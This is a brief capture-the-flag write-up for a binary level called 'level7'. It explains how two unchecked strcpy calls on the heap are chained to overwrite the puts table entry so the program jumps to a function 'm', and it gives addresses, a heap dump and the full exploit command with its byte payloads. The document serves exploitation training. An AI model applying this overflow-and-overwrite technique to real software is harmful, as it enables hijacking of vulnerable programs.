# level7

This time, we need to overwrite `puts` to call `m` instead. To do so, we use
the two unprotected `strcpy` calls, the first one to overwrite where the second is written
and the second to overwrite the address of `puts` and put the address
of `m` instead.

## Useful infos

str1 = esp+0x1c = 0x0804a008  
str2 = esp+0x18 = 0x0804a028  
fgets string: 0x8049960  
address of puts in plt: 0x08049928  
address of m: 0x080484f4  

le heap:
```
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
```

exploit arg 1: `echo -e "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x11\x01\x01\x01\x02\x01\x01\x01\x28\x99\x04\x08"`  
exploit arg 2: `echo -e "\xf4\x84\x04\x08"`

`./level7 $(echo -e "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x11\x01\x01\x01\x02\x01\x01\x01\x28\x99\x04\x08") $(echo -e "\xf4\x84\x04\x08")`